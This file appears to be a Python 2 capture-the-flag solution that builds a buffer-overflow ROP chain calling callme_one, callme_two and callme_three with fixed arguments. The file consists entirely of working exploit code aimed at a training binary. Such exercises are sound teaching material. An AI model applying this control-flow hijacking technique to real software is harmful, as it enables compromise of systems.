#!/usr/bin/python2.7
import struct;
x=lambda a:struct.pack('<I', a);

popx3_ret = 0x80488a9 # pop esi; pop edi; pop ebp; ret;

payload = 'D'*40 # Fill buffer
payload += 'BBBB' # EBP, junk

payload += x(0x080485c0) # Address of callme_one (PLT) # info func callme
payload += x(popx3_ret) # return address 
# params
payload += x(0x1) 
payload += x(0x2)
payload += x(0x3)

payload += x(0x08048620) # callme_two
payload += x(popx3_ret)
payload += x(0x1)
payload += x(0x2)
payload += x(0x3)

payload += x(0x080485b0) # callme_three
payload += x(popx3_ret)
payload += x(0x1)
payload += x(0x2)
payload += x(0x3)


print payload

